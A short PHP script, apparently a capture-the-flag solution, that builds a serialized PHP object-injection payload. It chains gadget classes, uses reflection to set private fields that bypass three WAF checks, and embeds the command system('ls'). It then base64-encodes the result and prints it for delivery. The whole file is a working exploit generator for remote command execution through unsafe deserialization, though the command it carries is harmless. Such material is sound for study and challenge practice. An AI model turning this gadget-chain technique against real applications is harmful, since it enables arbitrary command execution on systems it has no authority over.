<?php

require_once 'GadgetOne/Adders.php';
require_once 'GadgetThree/Vuln.php';
require_once 'GadgetTwo/Echoers.php';

use GadgetOne\Adders;
use GadgetThree\Vuln;
use GadgetTwo\Echoers;

$vuln = new Vuln();
$vuln->cmd = "system('ls');";
$vuln->waf1 = 1;

// 使用PHP的反射API来设置protected和private属性
$reflector = new ReflectionObject($vuln);
$waf2 = $reflector->getProperty('waf2');
$waf2->setAccessible(true);
$waf2->setValue($vuln, "\xde\xad\xbe\xef");

$waf3 = $reflector->getProperty('waf3');
$waf3->setAccessible(true);
$waf3->setValue($vuln, false);

$adders = new Adders($vuln);

$echoers = new Echoers();

// 使用PHP的反射API来设置protected属性
$reflector = new ReflectionObject($echoers);
$klass = $reflector->getProperty('klass');
$klass->setAccessible(true);
$klass->setValue($echoers, $adders);

$payload = serialize($echoers);
$payloadBase64 = base64_encode($payload);

echo $payloadBase64;
?>
